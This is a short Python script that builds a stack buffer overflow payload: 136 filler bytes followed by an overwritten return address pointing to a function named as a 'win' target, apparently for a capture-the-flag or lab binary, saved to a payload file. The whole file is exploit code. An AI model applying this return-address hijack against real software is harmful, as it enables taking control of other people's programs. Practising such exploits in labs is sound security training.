#!/usr/bin/env python3

import struct
from pathlib import Path

OFFSET = 136
WIN_ADDRESS = 0x4012b6

payload = b"A" * OFFSET
payload += struct.pack("<Q", WIN_ADDRESS)

output = Path("inbox/payload.bin")
output.parent.mkdir(parents=True, exist_ok=True)
output.write_bytes(payload)

print(f"Payload saved to: {output}")
print(f"Payload size: {len(payload)} bytes")
print(f"Return address offset: {OFFSET} bytes")
print(f"Target function address: {hex(WIN_ADDRESS)}")
